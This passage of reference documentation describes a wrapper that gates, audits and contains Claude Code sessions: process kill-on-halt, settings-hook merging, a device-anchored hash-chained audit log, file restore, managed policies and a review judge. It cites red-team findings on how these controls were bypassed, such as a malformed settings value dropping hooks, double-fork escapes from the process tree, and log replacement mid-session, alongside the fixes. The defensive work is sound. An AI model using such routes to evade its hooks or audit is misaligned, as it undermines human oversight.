15. **Watch the hardware root.** On a halt (DIRTY, device gone), Enclawed Code stops claude and everything it started, then erases Claude Code's login (see [hardware halt](#hardware-halt-and-claude-codes-login)), and exits 4. claude runs inside a transient systemd user scope when `systemd-run --user --scope` works, and a stop kills every process in it; on Linux claude is also its own child subreaper (a one-line python3 or perl wrapper). Neither can be turned off. The helpers (`systemd-run`, `systemctl`, `python3`, `perl`, and likewise `git`, `ps`, `ss` and macOS `security`) are run from `/usr/bin`, `/bin`, `/usr/sbin` or `/sbin` only, owned by root and not writable by group or other, never looked up on your `PATH`; python3 runs isolated (`-I -S`) and perl's own variables (`PERL5LIB`, `PERL5OPT`, ...) are kept from the wrapper and given back to claude. **When a hardware root is held and neither the scope nor the subreaper wrapper is available, Enclawed Code refuses to start (exit 4)**: on a halt, a process that left claude's tree and cleared its environment could not be found before the login is erased. An administrator who accepts that sets `"reducedContainment": true` in the [opt-out file](#admin-only-opt-outs); the start is then warned on and audited. On macOS (no subreaper, no systemd) the session is contained by process tracking instead (docs/usage.md: every process seen below claude, by pid and start time, and every process group one of them leads), so no grant is needed; claude's environment also carries a random `ECWCODE_SESSION_MARK`, and a stop kills every process of yours whose environment carries it. Both reach a `setsid`/double-fork escaper that left claude's process tree (red-team round 3, N12; remaining escapes are listed in docs/usage.md). A headless claude also runs in its own process group, which is signaled as a whole. An interactive claude must stay in the terminal's foreground group to own the terminal, so Enclawed Code instead signals its whole process tree and the process groups its descendants lead (hook and tool commands run in sessions of their own). It sends SIGTERM first and SIGKILL after 3 s, using the tree captured before the first signal (red-team round 2, N7).
16. **Forward signals.** SIGTERM, SIGHUP, SIGQUIT, SIGUSR1, SIGUSR2 and SIGWINCH are forwarded to claude. SIGINT is ignored by Enclawed Code when claude shares its process group (the terminal already delivers it), and forwarded when claude has its own.
17. **Clean up** when claude exits: the session directory is removed (unless the session is a background one), the device anchor is updated a last time and the hardware root is released. `claude-code.launch` and `claude-code.launch.end` records bracket the run.

### Exit codes

| Code | When |
|---|---|
| claude's own exit code | claude exited normally. |
| killed by the same signal | claude was killed by a signal; Enclawed Code re-raises it on itself. If that does not end Enclawed Code, it exits 128 + the signal number (SIGHUP 1, SIGINT 2, SIGQUIT 3, SIGKILL 9, SIGTERM 15, anything else 1). |
| 127 | No usable claude, or claude could not be started. This applies to non-session commands too. |
| 2 | `--bare`/`--safe-mode`, a too-old or unknown claude version, an unusable or unmergeable `--settings` value, a project that contains Enclawed Code or its state, a project hook of any event, a framework that cannot load. |
| 3 | Enclawed's hooks never reported in (no verified handshake), or a tool call ran without a decision from the hook. |
| 4 | The hardware root refused to start, or halted during the session (claude was stopped; Claude Code's login erased unless the policy opts out). |
| 5 | Activation auth refused, not set up while required, or backing off after failures. |
| 7 | Admission broke during the session: a verified skill's files changed or a new skill appeared, or an admitted MCP server changed a pinned tool definition (rug pull), offered an unpinned tool or reported another identity. claude was stopped. |
| 6 | The Enclaweder holds anchors, and the audit log, its anchor file or its anchor history does not match them (or is missing): a session would launder the log (round 5, R5-A). Nothing was started; see [`audit accept`](#ecwctl-audit-accept). |

Failure messages (all on stderr, prefixed `ecwcode: `):

- `--bare turns off settings hooks, which would switch Enclawed off; run plain `claude --bare` if you mean to work without it` (same for `--safe-mode`)
- `Claude Code <version> at <path> is older than 2.1.295, the first version that blocks a tool call when its hook fails. Update Claude Code (`claude update`).` (`(unknown version)` when it cannot be read)
- `--settings needs a value (a settings file or a JSON string)`
- `cannot read --settings file <abs path>: <error>`
- `<abs path> is not valid JSON: <error>` / `the --settings JSON string is not valid JSON: <error>`
- `<source> is not a JSON object`

Warnings (stderr, the session still starts):

- `ignoring disableAllHooks from --settings: it would switch Enclawed off`
- `<file> sets disableAllHooks; Enclawed Code's settings override it for this session`, for each of `$CLAUDE_CONFIG_DIR/settings.json` (default `~/.claude/settings.json`), `./.claude/settings.json` and `./.claude/settings.local.json` that sets `disableAllHooks: true`.

### `--settings` merging

Claude Code reads a single `--settings` value (a later one replaces an earlier one), so Enclawed Code takes every `--settings X` and `--settings=X` that appears before a standalone `--` out of the argument list, in order, and merges them into the file it generates:

- A value whose trimmed text starts with `{` is parsed as a JSON string; anything else is a path, resolved against the current directory, and read as JSON. It must be a JSON object.
- Values are merged left to right: later scalars and arrays win, nested objects merge key by key, and `hooks` lists are **concatenated per event**, so your hook entries are kept next to Enclawed's.
- Enclawed's hooks are appended last, and `disableAllHooks` is set to `false` whatever your values said (with the warning above). `--settings` ranks above user, project and local settings in Claude Code, so this also outranks a `disableAllHooks: true` in those files (verified with Claude Code 2.1.326).
- `--settings` values after `--` are not touched.
- **Every value is checked against Claude Code's own schema before it is merged** (red-team round 4, F1: `{"$schema": 5}` passed the round-3 hand-written list and made Claude Code drop the whole file, hooks included). The validator is generated: `src/claude-settings-schema.json` (the same document as `test/fixtures/claude-settings-schema-2.1.326.json`, read out of the claude binary by `scripts/claude-settings-schema.mjs`) holds the minified zod definition of every key Enclawed Code merges, and `src/settings-schema.mjs` parses those definitions and checks every key, nested key and value (strings, numbers with their `int`/`positive`/`min` bounds, finite only, enums, literals, arrays, records, unions). A key outside the pinned list, a nested key the schema does not define, or a value under a rule Enclawed Code cannot run (`.refine`, an unknown helper) is refused; a value under `.catch(...)` is accepted, because Claude Code replaces it instead of dropping the file. `test/round4.test.mjs` runs a wrong-typed value for every key and every nested key, and loads a document with every accepted key in the real binary.

The generated hooks (identical to the managed template):

| Event | Matcher | Timeout | Extra |
|---|---|---|---|
| `PreToolUse` | `*` | 10 s | `"onFailure": "block"`: a crash, timeout or unexpected exit blocks the call |
| `PostToolUse`, `PostToolUseFailure` | `*` | 10 s | |
| `SessionStart`, `SessionEnd`, `ConfigChange` | (none) | 10 s | |

The hook command is `'<node>' '<install>/bin/ecwcode-hook.mjs' --origin launcher` (POSIX single quotes; on Windows each part is double-quoted), with `<node>` the Node executable running Enclawed Code.

The settings file is `<private session root>/enclawed-code-<uid>/s-XXXXXX/settings.json` (the root is the first of `XDG_RUNTIME_DIR`, `TMPDIR`, the system temp directory and the state directory that is not inside the project), directory mode 0700, file mode 0600, created exclusively. It is removed when claude exits, except when `--bg` or `--background` appears among the options: a background session outlives Enclawed Code and keeps reading it, so it is left in place. Background sessions get no control socket and no transcript watch (they outlive Enclawed Code); see step 14.

### Examples

```bash
ecwcode                                       # interactive
ecwcode -p "fix the failing test"             # headless
ecwcode --settings ./team.json --model opus   # team.json is merged, not dropped
ecwcode mcp list                              # no session: passed straight through
ecwcode doctor                                # Claude Code's doctor (Enclawed Code's: ecwctl doctor)
ecwcode "audit the error handling"            # a prompt, as with claude
ECWCODE_CLAUDE_PATH=/opt/claude/bin/claude ecwcode
```

---

## `ecwctl history`

The local, content-addressed history of file content that agent writes replaced. It is shared with the Enclawed gateway: both use the same directory.

Each subcommand checks its options first (an unknown option, a missing value or a `--limit` that is not a positive whole number is a usage error, exit 2) and only then loads the framework and your policy (the policy's `history` caps apply).

Location: `$ENCLAWED_HISTORY_DIR` if set, otherwise `<enclawed state dir>/history` (see [files](#files-and-directories)). Layout: `objects/<sha256>` (prior content, mode 0600) and `index.jsonl`.

**Entries come from the audit log.** The index file has no integrity protection of its own, so Enclawed Code does not trust it: the entries it lists and restores are the snapshot targets of `claude-code.tool.pre` records (and the replaced content of earlier restores) in the hash-chained audit log, each with the file's real path, the project it belongs to and its mode. An entry's **id** is the first 12 hex digits of that audit record's hash. Index entries no audit record confirms (the Enclawed gateway's own snapshots, which share the store, and anything planted there) are shown only with `--all`, marked `[unverified]`.

### `ecwctl history list`

```
ecwctl history list [--path P] [--limit N] [--all] [--json]
```

| Option | Type | Default | Meaning |
|---|---|---|---|
| `--path P` | path | all entries | Only entries whose real path (or recorded path) is `P`. |
| `--limit N` | positive whole number | 50 | Show the last `N` entries (newest last). |
| `--all` | flag | off | Also list unverified index entries. |
| `--json` | flag | off | Print the entries as a JSON array. |

Human output, one line per entry:

```
4091f6315e91  2026-11-22T01:27:44.664Z  write   25718360e05d  /home/me/proj/src.txt  [Write]

Restore one with: ecwctl history restore <id>
```

Columns: entry id, time (UTC), operation, the first 12 hex digits of the **prior** content's SHA-256 (`(new file)` when the write created the file), the real path, the tool. Exit 0.

### `ecwctl history restore`

```
ecwctl history restore <id> [--to P] [--unverified]
```

Options may come before or after the id.

| Option | Meaning |
|---|---|
| `<id>` | An entry id from `history list` (a unique prefix of at least 6 characters works). A full 64-hex snapshot hash is accepted only when every entry with it names the same file; otherwise the restore is refused and lists the ids to choose from. |
| `--to P` | Write the content to `P` instead of the recorded path. Needed for entries outside their recorded project and for unverified entries. |
| `--unverified` | Also accept unverified index entries (always together with `--to`). |

What it does, in order: verifies the audit chain (a log that does not verify cannot authenticate entries); resolves the entry; checks [activation auth](#activation-auth) when it is set up; checks that the snapshot's bytes still hash to its name (`tampered` otherwise); refuses a recorded path outside the entry's recorded project unless `--to` is given; keeps the file it replaces as a new snapshot; writes through a temporary file and renames it into place, **with the original file's mode** (the recorded mode, else the replaced file's); records `claude-code.history.restore` with `outcome: "restored"` or `"refused"` and a code (`no-content`, `sandbox`, `unverified`, `path-binding`, `tampered`, `missing`, `write-failed`).

Output on success: `restored <id> (<hash prefix>) to <path>`, plus ` (what it replaced is kept as <hash prefix>)`.

**Sandbox snapshots.** A snapshot the Enclawed gateway took inside a sandbox can only go back into that sandbox, which Enclawed Code cannot open. It is refused with code `sandbox` and the message names the way out: `ecwctl history restore <hash> --unverified --to <path>` puts its content on this machine. Snapshots Enclawed Code takes are never sandbox snapshots.

A write that created a file has no content to restore (`no-content`); undo it by deleting the file.

### `ecwctl history prune`

```
ecwctl history prune
```

Drops index entries older than `enclawed.policy.history.maxAgeDays` (default 30) and deletes stored versions no remaining entry references, except objects younger than 60 s (another process may have stored one and not indexed it yet). Prints `removed <n> entries and <m> stored versions`, exit 0. Pruning also runs automatically when a snapshot is stored, at most once every 10 minutes per process; since Claude Code starts a new hook process for every event, in practice that is every time a hook stores a snapshot. The store never evicts by size: a snapshot that would push it past `history.maxTotalBytes` is refused, and that write becomes irreversible (`over-retention-budget`).

Any other `history` subcommand (or none) prints the usage and exits 2, without loading the framework.

---

## `ecwctl audit`

The hash-chained audit log at `<enclawed state dir>/claude-code/audit.jsonl` (see [audit records](#audit-records)). Every record carries the SHA-256 of the previous one, and the hash of the newest record is also kept beside the log in `audit.jsonl.head`, so an edited, inserted, removed or truncated record is detected. **Limit:** anyone who can write both files (the same user, outside Enclawed Code) can replace the whole history with a self-consistent forgery; only the device anchor detects that, see [enterprise: compromised-host threat model](enterprise.md#compromised-host-threat-model).

### `ecwctl audit verify`

```
ecwctl audit verify [--json]
```

Recomputes the whole chain, across rotated segments if any, and compares its end with the head anchor; then applies Enclawed Code's own rules and, with an Enclaweder attached, the device anchor:

- **Gaps.** Before every append the hook compares the log's last record with the head anchor. If they disagree (records removed, the log or anchor replaced, red-team I5), it writes a `claude-code.audit.gap` record naming both hashes before its own record, and shows `Enclawed: the audit log was changed outside Enclawed Code (<reason>); a gap record was written. Run: ecwctl audit verify` to the user. A log that contains a gap record does not verify, permanently.
- **A missing log.** A head anchor or rotated segment without the log is a failure (I6), not "no log yet".
- **Device anchor** (`--no-device` skips it). The launcher anchors the log's head in the bound Enclaweder (signed, with a monotonic counter the host cannot set) every 2 s while the head moves and at the end of the session, and prints the counter. `verify` reads the device's anchor: `matched` (the device's head is a record of this chain; newer records not anchored yet are counted), `MISMATCH` (the device's head is not in this chain: records were removed, or the log was rewritten or fabricated, which fails verification), `superseded` (the device was anchored again since; this fails verification too, red-team round 3, N10b, since it cannot be told apart from a truncation behind a restored anchor copy), or `unavailable` (no device, the device is owned by another process, or its firmware has no anchor commands). The head anchor is per device, so one device anchors one log at a time. Both trust domains are accepted: an Enclaweder Base (serial `ENCLW-…`, model 1 certificate) and an Enclaweder Pro (serial `ECPRO-…`, model 2 certificate from the Pro root); the serial Enclawed Code prints follows the domain the device's certificate proves. Verified on 2026-11-21 against a real Enclaweder Pro (current firmware): a session anchored the head, `verify` reported `device anchor: matched`, and a fabricated log plus head anchor (written with the framework's own `AuditLogger`, red-team I7) reported `MISMATCH` and exit 1. Records appended after the last anchor are reported as not anchored yet; they are not proven complete until the next anchor. A log whose own launch records say the hardware root was held (or required) verifies only when a fresh read of the device's anchor matches (the kit's `decideAuditAnchorVerdict`): `unavailable`, a stored copy, or `--no-device` leaves its completeness unproven, and `verify` fails.
- **Authenticated anchoring (record v2 firmware, red-team round 3, N10).** The device advances its anchor only under its one authenticated anchor session (`ANCHOR_OPEN`, then MAC'd `ANCHOR_SET`/`ANCHOR_CLOSE`; a bare `ANCHOR_SET` is refused). Which device a session anchors with is the kit's decision (`requireHardwareRootSessionAnchor`): the Enclaweder the launcher holds, or, for a client of the machine's device owner, the authenticated anchor session relayed through the owner; a bound session that cannot anchor with authentication is refused before claude starts (`anchor-unauthenticated`, exit 6). The launcher holds that session through the framework's `AnchorSession`, with the key only in the launcher's memory; the hook asks the launcher to anchor over the verified control socket. If the device answers BUSY (something else holds the channel) or the session is taken over, the launcher prints an `ALARM`, records `claude-code.launch.anchor-alarm` and stops claude (exit 3). It closes the session (`closeHeadAnchorSessions()`) before releasing the hardware root; a launcher that crashed without closing leaves the device BUSY until its lease runs out (firmware 0.2, 120 s) or, on firmware 0.1, until it is unplugged and plugged back in (see [`recover-anchor`](#ecwctl-recover-anchor)). `verify` fails with `foreign-session` when the device's head was set under a session this log never held, `downgrade` when the device answers with an older record format than this log was anchored with, and `foreign-open` when the device's open count is past this log's newest session. The launcher also keeps a device-signed history of its anchors (`audit.jsonl.enclaweder-anchors.jsonl`): an anchor file older than the history, an anchored head that is no longer in the log, or a device behind the history fails `verify`. A second log anchored on the same device is foreign to the first, so its `verify` fails; use `--no-device` when that is expected.
- **Only heads that extend the launcher's own chain are anchored** (red-team round 4, N14: a same-user process that deleted the anchor file and history and replaced the log mid-session had its fabricated head anchored by the launcher's own authenticated session). The launcher follows the log from the start of the session (`src/anchor-chain.mjs`): it keeps in memory the offset and hash of the last record it verified and a SHA-256 of every byte before it, and before each anchor checks that this prefix is unchanged (same file, or a genuine rotation: the sealed segment of it plus linked new segments), that every newer record recomputes its hash and links to the one before, and that the anchor file and the anchor history are byte for byte what it wrote. Any change raises `ALARM ANCHOR_TAMPER`, records `claude-code.launch.anchor-tamper`, stops claude (exit 3) and anchors nothing more. `verify` also requires the log's anchor history to extend the device-signed chain: a missing or empty history (`no-history`), a history that does not end at the device's own record (`history-behind`), or anchored heads out of log order (`history-order`) fail. Design: [anchor-auth-design.md](anchor-auth-design.md).
- **Measured launch.** Every `claude-code.session.start` record carries SHA-256 measurements of the hook, `src/*.mjs`, the framework bundle, the effective policy file and the session's settings. `verify` re-measures the files now and lists those that changed since the last measured session.

Human output:

- `audit log verifies: <count> records, head <first 16 hex>…, head anchor matched` (exit 0), then `device anchor: <status>: <detail>` and, when files changed, `measured launch: changed since the last measured session: ...`.
- `audit log does NOT verify: <reason>` (exit 1), with one line per gap record.
- `no audit log yet at <path>` (exit 0) when there is no log and nothing proves one existed.

`--json` always prints JSON: the framework's result plus `gaps`, `device`, `drift`, or `{ ok: true, empty: true, ... }` when there is no log.

### `ecwctl audit reconcile`

```
ecwctl audit reconcile [--json] [--no-transcripts]
```

Groups the log's `claude-code.*` records by session id and compares them with each other and with Claude Code's transcripts. It does not check the hash chain; run `audit verify` first.

| Option | Type | Default | Meaning |
|---|---|---|---|
| `--json` | flag | off | Print `{ sessions, findings: [{ session, severity, code, detail }] }`. |
| `--no-transcripts` | flag | off (transcripts are read) | Skip the transcript comparison. |

Findings:

| Severity | Code | Meaning |
|---|---|---|
| warn | `no-session-start` | Tool records for a session that has no `session.start` record. |
| info | `no-session-end` | No `session.end` record: still running, or ended without its end hook. |
| error | `ran-without-decision` | A `tool.post`/`tool.failure` record whose tool-use id has no recorded decision. |
| error | `ran-despite-deny` | A tool ran although its recorded decision was `deny`. |
| info | `allowed-no-result` | An allowed call has no result record (detail: `<id> (<tool>)`). Normal for a call that was then interrupted, or refused by Claude Code's own permission rules. |
| error | `transcript-call-without-decision` | A `tool_use` id in the session's Claude Code transcript (or one of its subagent transcripts) that has no recorded decision. |
| error | `tool-name-mismatch` | The decision recorded for a tool-use id names another tool than the transcript's call with that id (red-team round 3, N9). |
| error | `tool-input-mismatch` | The input recorded for a tool-use id (per-key digests) is not the transcript's call's input. |
| error | `input-changed-after-decision` | The input that ran (`tool.post`) is not the input Enclawed Code decided (`tool.pre`): another hook or plugin rewrote it. The hook also shows this to the user live. |
| error | `launch-without-hooks` | Enclawed Code started claude (`claude-code.launch`), but no `session.start` with that launch's nonce ever arrived: the hooks did not run. |
| error | `audit-gap` | A `claude-code.audit.gap` record: records were removed or the log replaced outside Enclawed Code. |
| warn | `transcript-missing` | A transcript named in a `session.start` record no longer exists. |

**What is compared against the transcripts.** Each `session.start` record holds the `transcript_path` Claude Code gave the hook. reconcile reads each such file (JSON Lines), collects the `id` of every object anywhere in it with `"type": "tool_use"`, and reports each one with no `tool.pre` or `hook.error` record for the same id. A transcript that no longer exists is reported (`transcript-missing`). Subagent transcripts are read too: the ones `SubagentStop` records name, and every `*.jsonl` in `<transcript without .jsonl>/subagents/`.

Human output: `<n> sessions, <k> launches, <m> findings`, then one line per finding: `  [<severity>] <session>: <code> <detail>`. Exit status 1 if any finding has severity `error`, otherwise 0. A missing log gives `0 sessions, 0 findings`, exit 0.

### `ecwctl audit path`

```
ecwctl audit path
```

Prints the audit log's absolute path. Exit 0.

Any other `audit` subcommand (or none) prints `usage: ecwctl audit verify|reconcile|accept|path` and exits 2.

### `ecwctl audit accept`

```
ecwctl audit accept
```

Before claude starts, the launcher runs the same device comparison as `audit verify` on the log as found (red-team round 5, R5-A: a log replaced between sessions, with its anchor file and history deleted, used to verify as `matched` once the next session had anchored it). When the device holds anchors and the log, its anchor file or its anchor history does not match them, or is missing, the launch is refused (exit 6, `claude-code.launch.refused` with `reason: "anchor-not-matched"`), and so is every later one, until a person runs `audit accept`. A fresh log on a device that already holds anchors (for example after an operator takeover, a restored log, or a second log on the same device) is refused the same way: Enclawed Code never starts a fresh history silently.

`audit accept` needs an interactive terminal, activation auth (no unlock ticket), the device's serial and the word `ACCEPT` typed in. It shows what the check found, moves the old anchor file and history aside (renamed `.superseded-<time>`, not deleted), appends a chained `claude-code.audit.accept` record naming what was found and the device's counter, session and open count before, and anchors that record on the device under a new anchor session, so the next launch matches. Records before the accept can no longer be proven complete by the device; the superseded files and the accept record say why. Every attempt is recorded (`claude-code.audit.accept-attempt`).

---

## `ecwctl managed print`

```
ecwctl managed print [--hook-command CMD] [--flavor open|enclaved] [--hardware-root required|optional]
```

Prints Claude Code managed settings that run Enclawed's hooks for every Claude Code session on the machine. Enclawed Code never writes these hooks to system directories itself (the one command that writes there is `sudo ecwctl managed login-policy install`, for its own drop-in).

| Option | Type | Default | Meaning |
|---|---|---|---|
| `--hook-command CMD` | string | `'/usr/bin/env' -i CLAUDE_PROJECT_DIR="$CLAUDE_PROJECT_DIR" '<node>' '<install>/bin/ecwcode-hook.mjs' --origin managed` for this installation | The full hook command line to put in every hook entry. |
| `--flavor F` | `open` or `enclaved` | open | Baked into the command line: in managed mode the hook reads nothing from its environment, so this is how an administrator chooses the flavor. |
| `--hardware-root M` | exactly `required` or `optional` | the framework's default | Baked into the command line as `ENCLAWEDER_ROOT` for the hook. The managed settings are root-owned, so `optional` is an administrator's choice here; the hook refuses (denies every call) any other value. |

**Template.** `managed/enclawed-code.json`, with every `__ECWCODE_HOOK_COMMAND__` replaced by the command. It sets `allowManagedHooksOnly: true`, `disableAllHooks: false`, `permissions.disableBypassPermissionsMode: "disable"`, `permissions.disableAutoMode: "disable"`, the seven hooks of the [table above](#--settings-merging) (the test suite checks they stay identical to the launcher's), and `sandbox: { enabled: true, failIfUnavailable: true, allowUnsandboxedCommands: false }`. See [enterprise.md](enterprise.md) for what each key does.

**Warnings.** Without `--hook-command`, Enclawed Code checks whether the current account can write to anything the managed hook runs from: the Node executable (and its real path), `bin/`, `src/`, `managed/`, the framework bundle and its dependency directory, and every ancestor directory of these (a writable ancestor lets a user rename a directory away and replace it). It prints `ecwcode: warning: <path> is writable by the current user` for up to 20 of them and a count on stderr. Run it as the user whose access matters (running it as root always warns).

Output: the JSON on stdout (2-space indent), exit 0. Anything other than `print` prints `usage: ecwctl managed print [--hook-command CMD]` and exits 2.

**Where it goes** (Claude Code's managed-settings directory):

| OS | Install |
|---|---|
| Linux, WSL | `sudo install -D -m 0644 enclawed-code.json /etc/claude-code/managed-settings.d/50-enclawed-code.json` |
| macOS | `sudo install -d "/Library/Application Support/ClaudeCode/managed-settings.d" && sudo install -m 0644 enclawed-code.json "/Library/Application Support/ClaudeCode/managed-settings.d/50-enclawed-code.json"` |
| Windows (admin PowerShell) | `New-Item -ItemType Directory -Force "C:\Program Files\ClaudeCode\managed-settings.d"; Copy-Item enclawed-code.json "C:\Program Files\ClaudeCode\managed-settings.d\50-enclawed-code.json"` |

```bash
ecwctl managed print > enclawed-code.json
node -e 'JSON.parse(require("fs").readFileSync(process.argv[1]))' enclawed-code.json   # validate first
```

Once installed, `ecwcode` detects it (the structural check of [launching](#what-happens), step 6) and stops adding its own hooks. On WSL, `/etc/claude-code` is writable by users; see [enterprise.md](enterprise.md).

---

## `ecwctl managed login-policy`

```
ecwctl managed login-policy print            # what install writes; changes nothing
ecwctl managed login-policy status           # exit 0 when in force, 1 when not
sudo ecwctl managed login-policy install     # root only
sudo ecwctl managed login-policy remove      # root only
```

On a managed install, plain `claude` can then neither sign in nor use a login stored on the machine, while `ecwcode` sessions reach Claude through Enclawed Code's relay with the login sealed under the Enclaweder (Linux; needs the device bound, see [enterprise.md](enterprise.md#plain-claude-cannot-sign-in-managed-login-policy)). The person signs in with [`ecwctl login new`](#claude-codes-login-sealed-login-watcher).

`install` prints exactly what it writes, then writes only what differs (idempotent):

- the directory `/etc/claude-code/enclawed-code-no-login` (owner root, mode 0555, empty);
- the drop-in `/etc/claude-code/managed-settings.d/90-enclawed-code-login.json` (owner root, mode 0644, written atomically):

```json
{
  "forceLoginOrgUUID": [],
  "env": {
    "CLAUDE_SECURESTORAGE_CONFIG_DIR": "/etc/claude-code/enclawed-code-no-login",
    "DISABLE_LOGIN_COMMAND": "1"
  }
}
```

It refuses without root (exit 1, nothing changed), refuses an existing directory that is not root's, empty and writable by nobody else, and records `claude-code.managed.login-policy.installed` in the invoking account's audit log (root's: `sudo ecwctl audit verify`). After writing it checks the result with the same rule as `status` and exits 1 if the policy is not in force. `remove` deletes the drop-in only when it is byte for byte what install writes, and the directory only when it is empty (`claude-code.managed.login-policy.removed`).

`status` (and `doctor`'s `managed login policy:` line) reports it in force only when every managed document Claude Code reads parses; some document sets `forceLoginOrgUUID` to `[]` and none sets it to anything else; some document pins `env.CLAUDE_SECURESTORAGE_CONFIG_DIR` and `env.DISABLE_LOGIN_COMMAND` to the values above and none sets them otherwise; the drop-in passes the root-owned file check (owner root, mode at most 0644, root-owned ancestors no group or other user can write); and the directory is a real, empty, root-owned directory no group or other user can write, with such ancestors. The decision is the kit's (`managedLoginPolicyStatus`, `managed-login-policy.ts`).

---

## `ecwctl doctor | version | help | demo`

```
ecwctl doctor
ecwctl version        # same as: ecwctl --version, ecwctl -v
ecwctl help           # same as: ecwctl --help, ecwctl -h, and plain: ecwctl
ecwctl demo [--json] [--scenario IDS]
```

### `version`

Prints the version from `package.json` (for example `0.666.0`). Exit 0.

### `help`

Prints the list of Enclawed Code's own commands. Exit 0. `ecwctl <anything else>` prints `ecwctl: unknown command "<word>"` and the list on stderr, exit 2.

### `doctor`

Checks the installation and prints one line per item: `ok ` (passed), `!! ` (a problem) or `-` (information).

```
Enclawed Code 0.666.0 (/home/me/enclawed-code)
ok  claude: /home/me/.local/bin/claude
ok  claude version 2.1.326 (needs 2.1.295+)
ok  no claude option is taken by ecwcode's own launch options (--workflow, --passphrase-fd)
ok  enclawed framework: /home/me/enclawed-code/.enclawed-dev/framework/framework.js
ok  policy: /home/me/.enclawed/enclawed.json (flavor open, allowlists not enforced)
- pre-approved irreversible tools: none, so each irreversible call is asked about (to pre-approve a tool: preApprovedIrreversibleTools, with ecwctl policy edit)
- WebFetch hosts allowed without asking: none, so a fetch from any host is asked about (to allow one: ecwctl policy add-host <host>)
- history: /home/me/.enclawed/history
ok  audit log: /home/me/.enclawed/claude-code/audit.jsonl (12 records, verifies)
ok  hardware root: software-only
- managed hooks: not installed, which is fine: each ecwcode session adds Enclawed's hooks itself (no managed settings file); to check plain claude too, an administrator installs them: ecwctl managed print
- managed policy: none: your own policy applies (see ecwctl policy show); an organization's policy would go in /etc/enclawed/claude-code/policy.json
```

| Line | Problem when |
|---|---|
| `claude:` | no claude found (`claude: not found on PATH`). |
| `claude version` | older than 2.1.295 or unreadable. |
| launch options | `claude --help` lists an option named `--workflow` or `--passphrase-fd`, which ecwcode takes as its own. |
| `enclawed framework:` | the framework cannot be loaded or lacks a required export (then the lines up to `hardware root` are skipped). The framework is always `.enclawed-dev/framework/framework.js`, built from the `vendor/enclawed-oss` submodule by `npm run build:framework`; when it is missing every command says how to build it. |
| `policy:` | the policy cannot be loaded (would deny every call), or a note says an open-flavor config was ignored. |
| `audit log:` | the log exists and does not verify. |
| `hardware root:` | the root refuses to boot or its check refuses calls. Doctor boots the root and closes its session again. |
| `activation auth:` | not set up (the next line lists the methods available on this machine). |
| current directory | it contains Enclawed Code's install or state (a session would be refused here). |
| `MCP server NAME does not start` | its admission record was made before containment: pin it again with the folders, programs and hosts it needs (`mcp pin NAME --containment FILE`). A remote server's record without its signed URL and transport (`does not connect`): `mcp pin NAME`. A record that no longer verifies: pin it again or `mcp unpin NAME`. |
| `the EVENT hook in FILE has no grant for what it is now` | a hook (yours, a plugin's, a `--settings` value's or the repository's) with no grant for what it is now (none yet, or one made for an earlier form of it or by an earlier release): the line prints the exact entry an administrator adds to the root-owned grant file. A repository's refuses the launch; one of your own is asked about at a launch at a terminal (see [step 8](#what-happens)) and refuses a non-interactive one. |
| `the grant ... matches no hook here now` (information) | a grant whose hook changed or is gone: an administrator removes it. |
| `managed login policy:` (information) | whether plain `claude` can sign in or use a stored login here ([`managed login-policy`](#ecwctl-managed-login-policy)). |
| `login watcher:` and held logins | with a login sealed: a plaintext login doctor could not take out of Claude Code's reach, or a login made outside Enclawed Code that is held until `login resolve`. |

Exit status: 0 with no `!!` line, otherwise 1.

After an upgrade, run `ecwctl doctor` in each project you use: it lists every record to pin again and every hook to grant again, with the command or entry for each.

### `demo`

`ecwctl demo` replays planted-instruction attack scenarios through Enclawed Code's real hook in a throwaway sandbox: no model runs, nothing leaves the machine, and your own history and audit log are not touched. It is documented in [adversarial.md](adversarial.md); in brief:

| Option | Type | Default | Meaning |
|---|---|---|---|
| `--json` | flag | off | Print the results as JSON instead of one block per scenario. |
| `--scenario IDS` | comma-separated scenario ids | all scenarios | Run only these. An unknown id prints `ecwcode: unknown demo scenario <ids>; known: <ids>` and exits 2. |

Exit status: 0 when every scenario behaved as expected, 1 otherwise.

### `probe`

```
ecwctl probe <Tool> ['<tool_input JSON>'] [--mode PERMISSION_MODE] [--cwd DIR] [--json]
ecwctl probe --event SessionStart [--transcript FILE]
```

Asks `ecwcode-hook` for one decision exactly as Claude Code would (a session file from this shell's environment, the generated hook command, the event on stdin) and prints `<decision>: <reason>` (`--json`: the JSON Claude Code reads). Nothing is executed; the decision is recorded in the audit log like any other.

### `review` (experimental feature)

```
ecwctl review [status]
ecwctl review enable | disable
ecwctl review run
ecwctl review label
ecwctl review export [--out FILE]
```

**Experimental feature:** the judge is not yet calibrated against a live model. An opt-in, evaluation-only model judge. After the fact, never while Claude Code runs, it reads the calls the gate already decided (the `claude-code.tool.pre` records of the audit log), asks a model to classify each one (harmful, malicious consequential, legitimate consequential or harmless, by the definitions in Enclawed's adapter kit) and to say whether it agrees with the gate's decision, and shows you only the calls where the two disagree. You label each one; the labels are candidates for refining the rules, which stays a person's change through the policy.

The judge never changes a decision. The hook and everything it loads before it decides exclude the review code (checked by the tests and by `ecwctl conformance`: `adapter:claude-code:review-cannot-influence`, and Enclawed's own `review-judge-no-influence`), and the review code writes only its own state under `~/.enclawed/claude-code/review/` and the audit log.

| Subcommand | What it does |
|---|---|
| `status` (the default) | Whether the judge is on, how many decided calls are in the audit log and how many were judged, disagreements and labels. |
| `enable` | Turns the judge on. Off by default; turning it on needs your security key or passkey (the `policy-change` purpose) and writes `claude-code.review.enabled`. |
| `disable` | Turns it off (`claude-code.review.disabled`). |
| `run` | Judges the decided calls not judged before. It first prints how many calls it will send (at most 40 per run, one every 2 seconds, with the token estimate) and sends nothing unless you type `yes`. Exit 1 when the judge is off, when you do not confirm, or when the model cannot be reached; nothing is sent in each case. |
| `label` | Shows each unlabeled disagreement (the call, the gate's decision and reason codes, the judge's class and rationale) and asks `[a]` agree with the gate, `[j]` the judge is right, `[u]` unsure, `[s]` skip, `[q]` quit. Each label is written to `review/labels.jsonl` and recorded as `claude-code.review.labeled`. Needs a terminal. |
| `export [--out FILE]` | Writes the labeled disagreements as CSV (to standard output without `--out`): `id, tool, mode, gate_decision, gate_codes, judge_label, judge_expected, person_label, call_text, judge_rationale, labeled_at`. A field that starts with `=`, `+`, `-`, `@` or a tab is prefixed with `'` so a spreadsheet does not run it. Recorded as `claude-code.review.exported`. |

**Which model, on whose account.** The judge uses your Claude access only through Enclawed Code's sealed login and its relay, the same path a session uses: with an Enclaweder held, after your second factor and the code the Enclaweder verifies, the sealed login is opened into Enclawed Code's memory and the requests go through the relay, which adds the token. No other credential is used or created. Without an Enclaweder, or without a sealed login, `run` says so and sends nothing.

